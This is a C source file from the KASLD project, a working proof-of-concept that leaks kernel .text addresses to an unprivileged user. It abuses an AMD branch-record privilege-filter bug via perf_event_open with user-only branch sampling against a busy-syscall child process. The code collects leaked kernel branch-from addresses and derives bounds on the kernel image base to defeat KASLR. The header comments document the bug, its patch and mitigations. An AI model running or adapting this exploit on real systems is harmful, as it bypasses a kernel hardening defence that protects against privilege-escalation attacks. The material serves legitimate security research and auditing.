// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel .text addresses through an AMD branch-record privilege-filter bug
// (PERF_SAMPLE_BRANCH_USER at perf_event_paranoid=2).
//
// The INTENDED way to read kernel branch records — PERF_SAMPLE_BRANCH_KERNEL,
// the sibling perf_lbr_sampling.c — sets PERF_SAMPLE_BRANCH_PERM_PLM and so
// trips perf_allow_kernel(): it needs perf_event_paranoid<=1 or CAP_PERFMON.
// This component reaches the same kernel addresses WITHOUT that capability, by
// exploiting an AMD software-filter bug: it requests USER-only branches (which
// never set PERM_PLM, so the gate is never consulted and the event is allowed
// at the default paranoid=2 for one's own process), and the AMD branch filter
// forgets to mask the branch-FROM privilege.
//
// On AMD, branch privilege-level filtering is done entirely in software:
// amd_brs_match_plm() (Zen 3, X86_FEATURE_BRS) and the LBR-V2 filter (Zen 4,
// X86_FEATURE_AMD_LBR_V2) validate only the branch-TO address against the
// requested privilege level. For a branch FROM the kernel to user space — a
// SYSRET / ERET / interrupt return — the branch-from address is left unchecked
// and is delivered to a BRANCH_USER caller. Those sites sit at the very start
// of .text (the entry trampolines), so the leaked branch-from is a tight
// interior witness of the image base.
//
// A cycles event with PERF_SAMPLE_BRANCH_STACK + branch_sample_type =
// BRANCH_ANY|BRANCH_USER routes through amd_pmu_branch_hw_config() to BRS on
// Zen 3 or LBR-V2 on Zen 4 (both accept ANY|PLM); one attr covers both. Only
// branch-FROM carries the kernel leak, so only from-endpoints are kept.
//
// Untested: no AMD BRS/LBR-V2 hardware available; the branch-from disclosure
// has not been observed firing on real hardware.
//
// Leak primitive:
//   Data leaked:      kernel .text addresses (branch-from of SYSRET/ERET/IRET)
//   Kernel subsystem: arch/x86/events/amd — BRS (Zen3) / LBR-V2 (Zen4) filter
//   Data structure:   perf_branch_entry { from, to, flags } — the `from` field
//   Address type:     virtual (kernel text)
//   Method:           parsed (CPU hardware branch trace)
//   Access check:     NONE for kernel branch-from — the bug; opens at
//   paranoid=2 Patch:            amd_brs_match_plm / lbr filter also check
//   branch-from
//                     (v7.2-rc3, commits 47915e855fb3 (BRS) + 2a892294b83f
//                     (LBR-V2)). Hole present since v5.19 (BRS) / v6.1
//                     (LBR-V2).
//
// Self-detecting: emits only when a real kernel-text branch-from comes back, so
// it is a silent no-op on Intel (the hardware filter masks correctly), on AMD
// parts without BRS/LBR-V2, on a patched kernel, and under emulation (qemu-TCG
// models no BRS/LBR).
//
// Mitigations:
//   Patched at v7.2-rc3 (the software filter now checks branch-from). On an
//   unpatched kernel there is no unprivileged mitigation short of
//   perf_event_paranoid>=3 (which blocks own-process sampling entirely).
//
// x86_64 only — BRS/LBR are x86-specific AMD hardware.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/constraint.h"
#include "include/kasld/perf_branch.h"
#include <errno.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Opens a perf event requesting USER-only branches "
    "(branch_sample_type=ANY|USER) against a child doing a busy syscall loop. "
    "Requesting user branches never sets PERM_PLM, so the event is allowed at "
    "the default perf_event_paranoid=2 without CAP_PERFMON. On AMD (Zen 3 BRS "
    "/ "
    "Zen 4 LBR-V2) the software branch filter validates only the branch-to "
    "privilege, so kernel branch-from addresses of SYSRET/ERET/interrupt "
    "returns leak anyway - kernel .text. Patched v7.2-rc3; a no-op on "
    "Intel/patched/emulated CPUs.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "discloses:virtual\n"
           "note:bypasses_perfmon\n"
           "patch:v7.2\n");

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  if (kasld_skip_live_probe("perf AMD branch-user"))
    return 0;
  int verbose = kasld_is_verbose();

  long page_size = sysconf(_SC_PAGESIZE);
  if (page_size <= 0)
    return KASLD_EXIT_UNAVAILABLE;

  kasld_info("trying AMD BRANCH_USER branch-from leak on a busy-syscall "
             "child ...");

  pid_t child = fork();
  if (child == -1) {
    perror("[-] fork");
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (child == 0) {
    /* Busy syscall loop: each syscall return is a SYSRET whose branch-from is
     * a kernel entry-text address — the address this leak recovers. */
    struct utsname self;
    while (1)
      kasld_uname(&self);
    _exit(0);
  }

  /* Request USER branches only: this never sets PERM_PLM, so perf_allow_kernel
   * is not consulted and the event opens at the default paranoid=2. A cycles
   * event with BRANCH_STACK enables BRS (Zen 3) or LBR-V2 (Zen 4). exclude_
   * kernel=1 keeps event counting user-only (paranoid=2-safe); the branch-from
   * leak arrives through the branch stack regardless. */
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_HARDWARE;
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.size = sizeof(attr);
  attr.sample_period = 10000;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_BRANCH_STACK;
  attr.branch_sample_type = PERF_SAMPLE_BRANCH_ANY | PERF_SAMPLE_BRANCH_USER;
  attr.exclude_kernel = 1;
  attr.exclude_hv = 1;
  attr.disabled = 1;
  attr.wakeup_events = 1;

  long fd = kasld_perf_event_open(&attr, child, -1, -1, 0);
  if (fd < 0) {
    int e = errno;
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    if (e == EACCES || e == EPERM) {
      /* paranoid>=3 (own-process sampling blocked) or a hardened LSM. */
      fprintf(stderr, "[-] perf_event_open EACCES - perf_event_paranoid>=3?\n");
      return KASLD_EXIT_NOPERM;
    }
    if (e == ENOENT || e == EOPNOTSUPP) {
      kasld_err("no branch-record hardware (not AMD Zen3/Zen4, or no BRS/LBR)");
      return KASLD_EXIT_UNAVAILABLE;
    }
    errno = e;
    perror("[-] perf_event_open");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* Only branch-FROM endpoints carry the kernel leak under a USER request. */
  struct kasld_perf_min acc = {
      .min_addr = ~0UL, .n = 0, .from_only = 1, .verbose = verbose};
  int n_samples = kasld_perf_branch_collect(
      (int)fd, page_size, KASLD_PERF_TARGET_SAMPLES, kasld_perf_min_cb, &acc);

  close((int)fd);
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);

  if (n_samples < 0) {
    kasld_err("perf ring mmap/enable failed");
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (acc.n == 0) {
    /* Opened, but no kernel branch-from came back: Intel (filter correct),
     * a non-vulnerable AMD part, a patched kernel, or emulation. */
    kasld_err("no kernel branch-from leaked (not a vulnerable AMD kernel)");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* The leaked branch-from sits at image_base + offset (offset >= 0) — a sound
   * interior witness bounding image_base from above. Emit RAW; the engine's
   * range_from_interior derives the sound C_UPPER_BOUND on Q_VIRT_IMAGE_BASE.
   * See perf_lbr_sampling.c for the flooring rationale. */
  kasld_found("%lu kernel branch-from address(es) across %d sample(s)", acc.n,
              n_samples);
  kasld_info(
      "    lowest leaked kernel-text address: 0x%lx (upper bound on base)",
      acc.min_addr);
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, acc.min_addr, NULL,
                      CONF_PARSED);

  /* Entry-text branch-from sites sit in the base's own slot, so flooring the
   * lowest to the base grid is a within-one-slot GUESS: the base is that slot
   * or one below it. Emit the lower bound (floor - one slot) on the constraint
   * channel, at CONF_HEURISTIC so it shapes only the LIKELY window; a below-
   * _text bound is not an address and so is invisible to the anchor rules. The
   * interior sample supplies the sound upper bound. Gated on the 2 MiB grid
   * (x86 only), as in the sibling. */
#if KASLR_VIRT_ALIGN >= 2 * MB
  kasld_emit_constraint(Q_VIRT_IMAGE_BASE, C_LOWER_BOUND,
                        kasld_floor_text_base(acc.min_addr) - KASLR_VIRT_ALIGN,
                        CONF_HEURISTIC);
#endif
  return 0;
}
